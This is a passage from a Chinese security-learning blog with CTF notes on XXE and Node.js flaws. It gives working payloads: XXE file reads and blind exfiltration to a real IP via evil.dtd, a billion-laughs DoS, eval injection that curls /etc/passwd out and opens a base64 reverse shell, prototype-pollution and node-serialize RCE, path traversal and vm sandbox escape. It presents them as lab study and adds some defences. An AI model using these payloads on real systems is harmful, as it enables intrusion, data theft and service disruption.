src="/2022/04/19/xxe%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0/image-20220422003257935.png" alt="image-20220422003257935"></p><p>成功读取了我e盘的文件</p><p><img src="/2022/04/19/xxe%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0/image-20220422003239790.png" alt="image-20220422003239790"></p><p><strong>XXE常见利用方式</strong></p><p>与SQL相似，XXE漏洞也分为有回显和无回显<br> 有回显，可以直接在页面中看到payload的执行结果或现象。<br> 无回显，又称为blind xxe，可以使用外带数据(OOB)通道提取数据。即可以引用远程服务器上的XML文件读取文件。</p><h2 id="任意文件读取"><a href="#任意文件读取" class="headerlink" title="任意文件读取"></a><strong>任意文件读取</strong></h2><p><strong>我们在这里采用一个靶场来分析</strong></p><p><a href="https://github.com/c0ny1/xxe-lab">xxe-lab</a></p><img src="/2022/04/19/xxe%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0/image-20220422004849510.png" alt="image-20220422004849510" style="zoom:67%;"><p>靶场源码:</p><pre><code class="php">&lt;?php$USERNAME = &#39;admin&#39;; //账号$PASSWORD = &#39;admin&#39;; //密码$result = null;libxml_disable_entity_loader(false);$xmlfile = file_get_contents(&#39;php://input&#39;);try&#123;    $dom = new DOMDocument();    $dom-&gt;loadXML($xmlfile, LIBXML_NOENT | LIBXML_DTDLOAD);    $creds = simplexml_import_dom($dom);    $username = $creds-&gt;username;    $password = $creds-&gt;password;    if($username == $USERNAME &amp;&amp; $password == $PASSWORD)&#123;        $result = sprintf(&quot;&lt;result&gt;&lt;code&gt;%d&lt;/code&gt;&lt;msg&gt;%s&lt;/msg&gt;&lt;/result&gt;&quot;,1,$username);    &#125;else&#123;        $result = sprintf(&quot;&lt;result&gt;&lt;code&gt;%d&lt;/code&gt;&lt;msg&gt;%s&lt;/msg&gt;&lt;/result&gt;&quot;,0,$username);    &#125;   &#125;catch(Exception $e)&#123;    $result = sprintf(&quot;&lt;result&gt;&lt;code&gt;%d&lt;/code&gt;&lt;msg&gt;%s&lt;/msg&gt;&lt;/result&gt;&quot;,3,$e-&gt;getMessage());&#125;header(&#39;Content-Type: text/html; charset=utf-8&#39;);echo $result;?&gt;</code></pre><p><strong>有回显</strong></p><p>payload</p><pre><code class="xml">&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot; ?&gt;&lt;!DOCTYPE hack [&lt;!ENTITY file SYSTEM  &quot;file:///E:/phpstudy_pro/WWW/flag.txt&quot;&gt;]&gt;&lt;user&gt;  &lt;username&gt;&amp;file;&lt;/username&gt;  &lt;password&gt;hack&lt;/password&gt;&lt;/user&gt;</code></pre><p><img src="/2022/04/19/xxe%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0/image-20220422005656974.png" alt="image-20220422005656974"></p><p>当然，也可以使用<code>php://filter</code>协议读取qwzf.txt文件内容(也可以读取其他类型的文件，如：php文件)</p><p><img src="/2022/04/19/xxe%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0/image-20220422005948762.png" alt="image-20220422005948762"></p><p><strong>无回显</strong></p><p>无回显的话，就会麻烦许多</p><p>我们先修改源码，禁掉输出代码和报错信息，改成无回显。</p><p><img src="/2022/04/19/xxe%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0/image-20220422010158422.png" alt="image-20220422010158422"></p><p><img src="/2022/04/19/xxe%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0/image-20220422010234624.png" alt="image-20220422010234624"></p><p>遇到无回显，可以通过<code>Blind XXE</code>方法加上外带数据通道来提取数据，先使用<code>php://filter</code>协议获取目标文件的内容，然后将内容以<code>http</code>请求发送到攻击服务器来读取数据。虽无法直接查看文件内容，但我们可以使用易受攻击的服务器作为代理，在外部网络上执行扫描以及代码。即，当无回显情况时，可以将数据发送到远程服务器(攻击服务器)。</p><p>这里我的服务器ip为:39.105.71.63</p><p>构造payload</p><pre><code class="xml">&lt;?xml version=&quot;1.0&quot;?&gt;&lt;!DOCTYPE test[&lt;!ENTITY % file SYSTEM &quot;php://filter/read=convert.base64-encode/resource=E:/phpstudy_pro/WWW/flag.txt&quot;&gt;&lt;!ENTITY % dtd SYSTEM &quot;http://39.105.71.63:66/evil.dtd&quot;&gt;%dtd;%send;]&gt;</code></pre><p>远程服务器部署evil.dtd内容为:</p><pre><code class="xml">&lt;!ENTITY % all&quot;&lt;!ENTITY &amp;#x25;   send SYSTEM &#39;http://39.105.71.63:66/?%file;&#39;&gt;&quot;&gt;%all;</code></pre><p>内部的%号要进行实体编码成<code>&amp;#x25</code></p><p>我们直接把这个文件放到一个网站上，我这里就直接利用宝塔咯(我是懒狗)</p><p><img src="/2022/04/19/xxe%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0/image-20220422021836512.png" alt="image-20220422021836512"></p><p>然后向我们本地的靶机发送payload</p><p><img src="/2022/04/19/xxe%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0/image-20220422021925811.png" alt="image-20220422021925811"></p><p>成功回显出了文件</p><p><em>无回显攻击流程：</em></p><ul><li>先调用<code>%dtd</code>，请求远程服务器(攻击服务器)上的<code>evil.dtd</code>。</li><li>再调用 <code>evil.dtd</code>中的 <code>%file</code>。<code>%file</code> 获取受攻击的服务器上面的敏感文件，然后将 <code>%file</code> 的返回结果传到<code>%send</code> 。</li><li>然后调用 <code>%send;</code> 把读取到的数据发送到远程服务器上。</li></ul><p>这样就实现了外带数据的效果，解决 XXE 无回显的问题。</p><h2 id="执行系统命令"><a href="#执行系统命令" class="headerlink" title="执行系统命令"></a><strong>执行系统命令</strong></h2><p>在安装expect扩展的PHP环境里执行系统命令，其他协议也有可能可以执行系统命令。</p><pre><code class="xml">&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;&lt;!DOCTYPE xxe [&lt;!ELEMENT name ANY &gt;&lt;!ENTITY xxe SYSTEM &quot;expect://id&quot; &gt;]&gt;&lt;root&gt;&lt;name&gt;&amp;xxe;&lt;/name&gt;&lt;/root&gt;</code></pre><p>通过XXE可以实现RCE的实例很少。</p><h2 id="拒绝服务攻击-DDOS"><a href="#拒绝服务攻击-DDOS" class="headerlink" title="拒绝服务攻击(DDOS)"></a><strong>拒绝服务攻击(DDOS)</strong></h2><pre><code class="xml">&lt;?xml version=&quot;1.0&quot;?&gt;   &lt;!DOCTYPE lolz [&lt;!ENTITY lol &quot;lol&quot;&gt;&lt;!ENTITY lol2 &quot;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&quot;&gt;&lt;!ENTITY lol3 &quot;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&quot;&gt;&lt;!ENTITY lol4 &quot;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&quot;&gt;&lt;!ENTITY lol5 &quot;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&quot;&gt;&lt;!ENTITY lol6 &quot;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&quot;&gt;&lt;!ENTITY lol7 &quot;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&quot;&gt;&lt;!ENTITY lol8 &quot;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&quot;&gt;&lt;!ENTITY lol9 &quot;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&quot;&gt;]&gt;&lt;lolz&gt;&amp;lol9;&lt;/lolz&gt;</code></pre><p><strong>原理</strong>：递归引用,lol 实体具体还有 “lol” 字符串，然后一个 lol2 实体引用了 10 次 lol  实体，一个 lol3 实体引用了 10 次 lol2 实体，此时一个 lol3 实体就含有 10^2 个 “lol” 了，以此类推，lol9  实体含有 10^8 个 “lol” 字符串,最后再引用lol9。</p><h2 id="探测内网端口与探测内网网站"><a href="#探测内网端口与探测内网网站" class="headerlink" title="探测内网端口与探测内网网站"></a><strong>探测内网端口与探测内网网站</strong></h2><p>这个我没复现成功。。。先拿别人的吧</p><p>漏洞代码:</p><p>test.php</p><pre><code class="php">&lt;?php$xml = simplexml_load_string($_REQUEST[&#39;xml&#39;]);print_r($xml);//注释掉该语句即为无回显的情况?&gt;</code></pre><p>探测内网端口</p><pre><code class="xml">&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;&lt;!DOCTYPE xxe [&lt;!ELEMENT name ANY &gt;&lt;!ENTITY xxe SYSTEM &quot;http://127.0.0.1:80&quot; &gt;]&gt;&lt;root&gt;&lt;name&gt;&amp;xxe;&lt;/name&gt;&lt;/root&gt;</code></pre><p>3306端口开放<br> <a href="https://xzfile.aliyuncs.com/media/upload/picture/20191202152107-4ea0fe60-14d4-1.jpg"><img src="/2022/04/19/xxe%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0/20191202152107-4ea0fe60-14d4-1.jpg" alt="img"></a><br> 3389端口未开放<br> <a href="https://xzfile.aliyuncs.com/media/upload/picture/20191202152125-5979dc4e-14d4-1.jpg"><img src="/2022/04/19/xxe%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0/20191202152125-5979dc4e-14d4-1.jpg" alt="img"></a></p><h2 id="攻击内网网站"><a href="#攻击内网网站" class="headerlink" title="攻击内网网站"></a><strong>攻击内网网站</strong></h2><pre><code class="xml">&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;&lt;!DOCTYPE xxe [&lt;!ELEMENT name ANY &gt;&lt;!ENTITY xxe SYSTEM &quot;http://127.0.0.1:80/payload&quot; &gt;]&gt;&lt;root&gt;&lt;name&gt;&amp;xxe;&lt;/name&gt;&lt;/root&gt;</code></pre><h2 id="XXE漏洞防御"><a href="#XXE漏洞防御" class="headerlink" title="XXE漏洞防御"></a><strong>XXE漏洞防御</strong></h2><p><strong>1、使用开发语言提供的禁用外部实体的方法</strong><br> php:</p><pre><code class="php">libxml_disable_entity_loader(true);</code></pre><p>java:</p><pre><code class="java">DocumentBuilderFactory dbf =DocumentBuilderFactory.newInstance();dbf.setExpandEntityReferences(false);</code></pre><p>Python:</p><pre><code class="python">from lxml import etreexmlData = etree.parse(xmlSource,etree.XMLParser(resolve_entities=False))</code></pre><p><strong>2、过滤用户提交的XML数据</strong><br> 过滤关键字：<code>&lt;\!DOCTYPE</code>和<code>&lt;\!ENTITY</code>，或者<code>SYSTEM</code>和<code>PUBLIC</code>。<br> <strong>3、不允许XML中含有自己定义的DTD</strong></p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
          <category> 常见漏洞和手法 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> XXE </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>node.js常见漏洞学习</title>
      <link href="/2022/04/15/node-js%E5%B8%B8%E8%A7%81%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0/"/>
      <url>/2022/04/15/node-js%E5%B8%B8%E8%A7%81%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0/</url>
      
        <content type="html"><![CDATA[<p>[TOC]</p><h1 id="危险函数所导致的命令执行"><a href="#危险函数所导致的命令执行" class="headerlink" title="危险函数所导致的命令执行"></a>危险函数所导致的命令执行</h1><h2 id="eval"><a href="#eval" class="headerlink" title="eval()"></a>eval()</h2><p>eval() 函数可计算某个字符串，并执行其中的的 JavaScript 代码。和PHP中eval函数一样，如果传递到函数中的参数可控并且没有经过严格的过滤时，就会导致漏洞的出现。</p><p>简单例子:</p><pre><code class="javascript">var express = require(&quot;express&quot;);var app = express();app.get(&#39;/eval&#39;,function(req,res)&#123;res.send(eval(req.query.q));console.log(req.query.q);&#125;)var server = app.listen(8888, function() &#123;console.log(&quot;应用实例，访问地址为 http://127.0.0.1:8888/&quot;);&#125;)</code></pre><p><strong>漏洞利用</strong></p><p>node.js.js中的chile_process.exec调用的是/bash.sh，它是一个bash解释器，可以执行系统命令。在eval函数的参数中可以构造<code>require(&#39;child_process&#39;).exec(&#39;&#39;);</code>来进行调用。</p><p>弹计算器(windows):</p><pre><code class="javascript">/eval?q=require(&#39;child_process&#39;).exec(&#39;calc&#39;);</code></pre><p>读取文件(linux)：</p><pre><code class="javascript">/eval?q=require(&#39;child_process&#39;).exec(&#39;curl -F &quot;x=`cat /etc/passwd`&quot; http://vps&#39;);;</code></pre><p>反弹shell(linux)：</p><pre><code class="javascript">/eval?q=require(&#39;child_process&#39;).exec(&#39;echo YmFzaCAtaSA%2BJiAvZGV2L3RjcC8xMjcuMC4wLjEvMzMzMyAwPiYx|base64 -d|bash&#39;);# mFzaCAtaSA%2BJiAvZGV2L3RjcC8xMjcuMC4wLjEvMzMzMyAwPiYx是bash -i &gt;&amp; /dev/tcp/127.0.0.1/3333 0&gt;&amp;1 BASE64加密后的结果，直接调用会报错。注意：BASE64加密后的字符中有一个+号需要url编码为%2B(一定情况下)如果上下文中没有require,则可以使用global.process.mainModule.constructor._load(&#39;child_process&#39;).exec(&#39;calc&#39;)来执行命令</code></pre><h2 id="类似命令"><a href="#类似命令" class="headerlink" title="类似命令"></a>类似命令</h2><ol><li><p>间隔两秒执行函数</p><pre><code>setInteval(some_function, 2000)</code></pre></li><li><p>两秒后执行函数：</p><pre><code>setTimeout(some_function, 2000);</code></pre></li><li><p>some_function处就类似于eval函数的参数</p><pre><code>输出HelloWorld：    Function(“console.log(‘HelloWolrd’)”)()类似于php中的create_function</code></pre></li></ol><h1 id="Node-js-原型污染漏洞"><a href="#Node-js-原型污染漏洞" class="headerlink" title="Node.js 原型污染漏洞"></a>Node.js 原型污染漏洞</h1><h2 id="关于原型链"><a href="#关于原型链" class="headerlink" title="关于原型链"></a>关于原型链</h2><p>Javascript原型链参考文章：<a href="https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Inheritance_and_the_prototype_chain">继承与原型链</a></p><p>文章内关于原型和原型链的知识写的非常详细，就不再总结整个过程了，以下为几个比较重要的点：</p><p>1.在javascript，每一个实例对象都有一个prototype属性，prototype 属性可以向对象添加属性和方法。</p><pre><code>object.prototype.name=value</code></pre><p>2.在javascript，每一个实例对象都有一个<code>__proto__</code>属性，这个实例属性指向对象的原型对象(即原型)。可以通过以下方式访问得到某一实例对象的原型对象：</p><pre><code>objectname[&quot;__proto__&quot;]objectname.__proto__objectname.constructor.prototype</code></pre><p>3.不同对象所生成的原型链如下(部分)：</p><pre><code>var o = &#123;a: 1&#125;;// o对象直接继承了Object.prototype// 原型链：// o ---&gt; Object.prototype ---&gt; nullvar a = [&quot;yo&quot;, &quot;whadup&quot;, &quot;?&quot;];// 数组都继承于 Array.prototype// 原型链：// a ---&gt; Array.prototype ---&gt; Object.prototype ---&gt; nullfunction f()&#123;return 2;&#125;// 函数都继承于 Function.prototype// 原型链：// f ---&gt; Function.prototype ---&gt; Object.prototype ---&gt; null</code></pre><h2 id="原型链污染原理"><a href="#原型链污染原理" class="headerlink" title="原型链污染原理"></a>原型链污染原理</h2><p>对于语句：<code>object[a][b] = value</code> 如果可以控制a、b、value的值，将a设置为<code>__proto__</code>，我们就可以给object对象的原型设置一个b属性，值为value。这样所有继承object对象原型的实例对象在本身不拥有b属性的情况下，都会拥有b属性，且值为value。</p><p>来看一个简单的例子:</p><pre><code>object1 = &#123;&quot;a&quot;:1, &quot;b&quot;:2&#125;;object1.__proto__.foo = &quot;Hello World&quot;;console.log(object1.foo);object2 = &#123;&quot;c&quot;:1, &quot;d&quot;:2&#125;;console.log(object2.foo);</code></pre><p><img src="/2022/04/15/node-js%E5%B8%B8%E8%A7%81%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0/image-20220416000347433.png" alt="image-20220416000347433"></p><p>最终输出了两个hello word</p><p>为什么object2在没有设置foo属性的情况下，也会输出Hello  World呢？就是因为在第二条语句中，我们对object1的原型对象设置了一个foo属性，而object2和object1一样，都是继承了Object.prototype。在获取object2.foo时，由于object2本身不存在foo属性，就会往父类Object.prototype中去寻找。这就造成了一个原型链污染，所以原型链污染简单来说就是如果能够控制并修改一个对象的原型，就可以影响到所有和这个对象同一个原型的对象。</p><h2 id="merge操作导致原型链污染"><a href="#merge操作导致原型链污染" class="headerlink" title="merge操作导致原型链污染"></a>merge操作导致原型链污染</h2><p>merge操作是最常见可能控制键名的操作，也最能被原型链攻击。</p><p>例子:</p><pre><code class="javascript">function merge(target, source) &#123;for (let key in source) &#123;if (key in source &amp;&amp; key in target) &#123;merge(target[key], source[key])&#125; else &#123;target[key] = source[key]&#125;&#125;&#125;let object1 = &#123;&#125;let object2 = JSON.parse(&#39;&#123;&quot;a&quot;: 1, &quot;__proto__&quot;: &#123;&quot;b&quot;: 2&#125;&#125;&#39;)merge(object1, object2)console.log(object1.a, object1.b)object3 = &#123;&#125;console.log(object3.b)# merge() 函数用于合并两个数组内容到第一个数组。在本段代码的作用就是将待操作的对象merge到一个空对象中</code></pre><p>需要注意的点是：</p><p>在JSON解析的情况下，<code>__proto__</code>会被认为是一个真正的“键名”，而不代表“原型”，所以在遍历object2的时候会存在这个键。</p><p>我们来看下，有和没有JSON解析的区别</p><p><img src="/2022/04/15/node-js%E5%B8%B8%E8%A7%81%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0/image-20220416001143881.png" alt="image-20220416001143881"></p><p>所以代码在执行过程中会存在这么一步</p><pre><code class="javascript">target[__proto__]=source[__proto__]可理解为  object.prototype = &#123;&quot;b&quot;: 2&#125; 导致了原型链污染</code></pre><p>最终输出的结果为：</p><p><img src="/2022/04/15/node-js%E5%B8%B8%E8%A7%81%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0/image-20220416000830058.png" alt="image-20220416000830058"></p><p>可见object3的b是从原型中获取到的，说明Object已经被污染了。</p><h2 id="Code-Breaking-2018-Thejs"><a href="#Code-Breaking-2018-Thejs" class="headerlink" title="Code-Breaking 2018 Thejs"></a>Code-Breaking 2018 Thejs</h2><p>题目源码下载：<a href="http://code-breaking.com/puzzle/9/">http://code-breaking.com/puzzle/9/</a></p><p>server.js</p><pre><code class="javascript">const fs = require(&#39;fs&#39;)const express = require(&#39;express&#39;)const bodyParser = require(&#39;body-parser&#39;)const lodash = require(&#39;lodash&#39;)const session = require(&#39;express-session&#39;)const randomize = require(&#39;randomatic&#39;)const app = express()app.use(bodyParser.urlencoded(&#123;extended: true&#125;)).use(bodyParser.json())app.use(&#39;/static&#39;, express.static(&#39;static&#39;))app.use(session(&#123;    name: &#39;thejs.session&#39;,    secret: randomize(&#39;aA0&#39;, 16),    resave: false,    saveUninitialized: false&#125;))app.engine(&#39;ejs&#39;, function (filePath, options, callback) &#123; // define the template engine    fs.readFile(filePath, (err, content) =&gt; &#123;        if (err) return callback(new Error(err))        let compiled = lodash.template(content)        let rendered = compiled(&#123;...options&#125;)        return callback(null, rendered)    &#125;)&#125;)app.set(&#39;views&#39;, &#39;./views&#39;)app.set(&#39;view engine&#39;, &#39;ejs&#39;)app.all(&#39;/&#39;, (req, res) =&gt; &#123;    let data = req.session.data || &#123;language: [], category: []&#125;    if (req.method == &#39;POST&#39;) &#123;        data = lodash.merge(data, req.body)        req.session.data = data    &#125;        res.render(&#39;index&#39;, &#123;        language: data.language,         category: data.category    &#125;)&#125;)app.listen(3000, () =&gt; console.log(`Example app listening on port 3000!`))</code></pre><p>问题出在lodash.merge()函数,这个函数存在原型链污染漏洞。我们得寻找到可以利用的点。因为通过漏洞可以控制某一种实例对象原型的属性，所以我们需要去寻找一个可以被利用的属性。</p><p><img src="/2022/04/15/node-js%E5%B8%B8%E8%A7%81%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0/image-20220416004841823.png" alt="image-20220416004841823"></p><p>页面最终会通过lodash.template进行渲染</p><p><img src="/2022/04/15/node-js%E5%B8%B8%E8%A7%81%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0/image-20220416005502144.png" alt="image-20220416005502144"></p><p>跟踪到lodash/template.js中</p><p><img src="/2022/04/15/node-js%E5%B8%B8%E8%A7%81%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0/QyN5JVOde3YL8aZ.png" alt="template_js.png"></p><p>如图可以看到options是一个对象，sourceURL是通过下面的语句赋值的，options默认没有sourceURL属性，所以sourceURL默认也是为空。如果我们能够给options的原型对象加一个sourceURL属性，那么我们就可以控制sourceURL的值。</p><p>继续往下面看，最后sourceURL传递到了Function函数的第二个参数当中：</p><p><img src="/2022/04/15/node-js%E5%B8%B8%E8%A7%81%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0/pwoVFrOyfzJX42M.png" alt="template_js01.png"></p><p>通过构造chile_process.exec()就可以执行任意代码了。</p><p>最终可以构造一个简单的Payload作为传递给主页面的的POST数据(windows调用计算器)：</p><pre><code>&#123;&quot;__proto__&quot;:&#123;&quot;sourceURL&quot;:&quot;\nglobal.process.mainModule.constructor._load(&#39;child_process&#39;).exec(&#39;calc&#39;)//&quot;&#125;&#125;</code></pre><p>(这里直接用require会报错：ReferenceError: require is not defined</p><p>p神给了一个更好的payload：</p><pre><code>&#123;&quot;__proto__&quot;:&#123;&quot;sourceURL&quot;:&quot;\nreturn e=&gt; &#123;for (var a in &#123;&#125;) &#123;delete Object.prototype[a];&#125; return global.process.mainModule.constructor._load(&#39;child_process&#39;).execSync(&#39;id&#39;)&#125;\n//&quot;&#125;&#125;</code></pre><h1 id="node-serialize反序列化RCE漏洞-CVE-2017-5941"><a href="#node-serialize反序列化RCE漏洞-CVE-2017-5941" class="headerlink" title="node-serialize反序列化RCE漏洞(CVE-2017-5941)"></a>node-serialize反序列化RCE漏洞(CVE-2017-5941)</h1><p>漏洞出现在node-serialize模块0.0.4版本当中，使用<code>npm install node-serialize@0.0.4</code>安装模块。</p><p><strong>了解什么是IIFE：</strong></p><p>IIFE(立即调用函数表达式)是一个在定义时就会立即执行的 JavaScript 函数。</p><p>IIFE一般写成下面的形式：</p><pre><code>(function()&#123; /* code */ &#125;());// 或者(function()&#123; /* code */ &#125;)();</code></pre><ul><li><code>node-serialize@0.0.4</code>漏洞点</li></ul><p>漏洞代码位于node_modules\node-serialize\lib\serialize.js中：</p><p><img src="/2022/04/15/node-js%E5%B8%B8%E8%A7%81%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0/aDr6o823Ux4F5Zw.png" alt="serialize_eval.png"></p><p>其中的关键就是：<code>obj[key] = eval(&#39;(&#39; + obj[key].substring(FUNCFLAG.length) + &#39;)&#39;);</code>这一行语句，可以看到传递给eval的参数是用括号包裹的，所以如果构造一个<code>function()&#123;&#125;()</code>函数，在反序列化时就会被当中IIFE立即调用执行。来看如何构造payload：</p><p><strong>构造Payload</strong></p><pre><code class="javascript">serialize = require(&#39;node-serialize&#39;);var test = &#123; rce : function()&#123;require(&#39;child_process&#39;).exec(&#39;ls /&#39;,function(error, stdout, stderr)&#123;console.log(stdout)&#125;);&#125;,&#125;console.log(&quot;序列化生成的 Payload: \n&quot; + serialize.serialize(test));</code></pre><p>生成的Payload为：</p><pre><code class="javascript">&#123;&quot;rce&quot;:&quot;_$$ND_FUNC$$_function()&#123;require(&#39;child_process&#39;).exec(&#39;ls /&#39;,function(error, stdout, stderr)&#123;console.log(stdout)&#125;);&#125;&quot;&#125;</code></pre><p>因为需要在反序列化时让其立即调用我们构造的函数，所以我们需要在生成的序列化语句的函数后面再添加一个<code>()</code>，结果如下：</p><pre><code class="javascript">&#123;&quot;rce&quot;:&quot;_$$ND_FUNC$$_function()&#123;require(&#39;child_process&#39;).exec(&#39;ls /&#39;,function(error, stdout, stderr)&#123;console.log(stdout)&#125;);&#125;()&quot;&#125;</code></pre><p>(这里不能直接在对象内定义IIFE表达式，不然会序列化失败)</p><p>传递给unserialize(注意转义单引号)：</p><pre><code class="javascript">var serialize = require(&#39;node-serialize&#39;);var payload = &#39;&#123;&quot;rce&quot;:&quot;_$$ND_FUNC$$_function()&#123;require(\&#39;child_process\&#39;).exec(\&#39;ls /\&#39;,function(error, stdout, stderr)&#123;console.log(stdout)&#125;);&#125;()&quot;&#125;&#39;;serialize.unserialize(payload);</code></pre><p>执行命令成功，结果如图：</p><p><img src="/2022/04/15/node-js%E5%B8%B8%E8%A7%81%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0/V1hOMYz7fQ3KB6X.png" alt="serialize_result.png"></p><h1 id="Node-js-目录穿越漏洞复现-CVE-2017-14849"><a href="#Node-js-目录穿越漏洞复现-CVE-2017-14849" class="headerlink" title="Node.js 目录穿越漏洞复现(CVE-2017-14849)"></a>Node.js 目录穿越漏洞复现(CVE-2017-14849)</h1><p>漏洞影响的版本：</p><ul><li>Node.js 8.5.0 + Express 3.19.0-3.21.2</li><li>Node.js 8.5.0 + Express 4.11.0-4.15.5</li></ul><p>运行漏洞环境：</p><pre><code>cd vulhub/node/CVE-2017-14849/docker-compose builddocker-compose up -d</code></pre><p>用Burpsuite获取地址：<code>/static/../../../a/../../../../etc/passwd</code> 即可下载得到<code>/etc/passwd</code>文件</p><p><img src="/2022/04/15/node-js%E5%B8%B8%E8%A7%81%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0/L8pV6gXoAnJSRQ4.png" alt="node_dir.png"></p><h1 id="vm沙箱逃逸"><a href="#vm沙箱逃逸" class="headerlink" title="vm沙箱逃逸"></a>vm沙箱逃逸</h1><p>vm是用来实现一个沙箱环境，可以安全的执行不受信任的代码而不会影响到主程序。但是可以通过构造语句来进行逃逸：</p><p>逃逸例子：</p><pre><code>const vm = require(&quot;vm&quot;);const env = vm.runInNewContext(`this.constructor.constructor(&#39;return this.process.env&#39;)()`);console.log(env);</code></pre><p>执行之后可以获取到主程序环境中的环境变量</p><p>上面例子的代码等价于如下代码：</p><pre><code>const vm = require(&#39;vm&#39;);const sandbox = &#123;&#125;;const script = new vm.Script(&quot;this.constructor.constructor(&#39;return this.process.env&#39;)()&quot;);const context = vm.createContext(sandbox);env = script.runInContext(context);console.log(env);</code></pre><p>创建vm环境时，首先要初始化一个对象 sandbox，这个对象就是vm中脚本执行时的全局环境context，vm 脚本中全局 this 指向的就是这个对象。</p><p>因为<code>this.constructor.constructor</code>返回的是一个<code>Function constructor</code>，所以可以利用Function对象构造一个函数并执行。(此时Function对象的上下文环境是处于主程序中的) 这里构造的函数内的语句是<code>return this.process.env</code>，结果是返回了主程序的环境变量。</p><p>配合<code>chile_process.exec()</code>就可以执行任意命令了：</p><pre><code>const vm = require(&quot;vm&quot;);const env = vm.runInNewContext(`const process = this.constructor.constructor(&#39;return this.process&#39;)();process.mainModule.require(&#39;child_process&#39;).execSync(&#39;whoami&#39;).toString()`);console.log(env);</code></pre><p>最近的mongo-express RCE(CVE-2019-10758)漏洞就是配合vm沙箱逃逸来利用的。</p><p>具体分析可参考：<a href="https://xz.aliyun.com/t/7056">CVE-2019-10758:mongo-expressRCE复现分析</a></p><h1 id="javascript大小写特性"><a href="#javascript大小写特性" class="headerlink" title="javascript大小写特性"></a>javascript大小写特性</h1><p>在javascript中有几个特殊的字符需要记录一下</p><p>对于toUpperCase():</p><pre><code>字符&quot;ı&quot;、&quot;ſ&quot; 经过toUpperCase处理后结果为 &quot;I&quot;、&quot;S&quot;</code></pre><p>对于toLowerCase():</p><pre><code>字符&quot;K&quot;经过toLowerCase处理后结果为&quot;k&quot;(这个K不是K)</code></pre><p>在绕一些规则的时候就可以利用这几个特殊字符进行绕过</p><p><strong>CTF题实例 - Hacktm中的一道Nodejs题</strong></p><p>题目部分源码：</p><pre><code class="javascript">function isValidUser(u) &#123;  return (    u.username.length &gt;= 3 &amp;&amp;    u.username.toUpperCase() !== config.adminUsername.toUpperCase()  );&#125;function isAdmin(u) &#123;  return u.username.toLowerCase() == config.adminUsername.toLowerCase();&#125;</code></pre><p>解题时需要登录管理员的用户名，但是在登录时，<code>isValidUser</code>函数会对用户输入的用户名进行<code>toUpperCase</code>处理，再与管理员用户名进行对比。如果输入的用户名与管理员用户名相同，就不允许登录。</p><p>但是我们可以看到，在之后的一个判断用户是否为管理员的函数中，对用户名进行处理的是<code>toLowerCase</code>。所以这两个差异，就可以使用大小写特性来进行绕过。</p><p>题目中默认的管理员用户名为：hacktm</p><p>所以，我们指定登录时的用户名为：hacKtm 即可绕过<code>isValidUser</code>和<code>isAdmin</code>的验证。</p><hr>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
          <category> 常见漏洞和手法 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> node.js </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>rce常用脚本</title>
      <link href="/2022/04/12/rce%E5%B8%B8%E7%94%A8%E8%84%9A%E6%9C%AC/"/>
      <url>/2022/04/12/rce%E5%B8%B8%E7%94%A8%E8%84%9A%E6%9C%AC/</url>
      
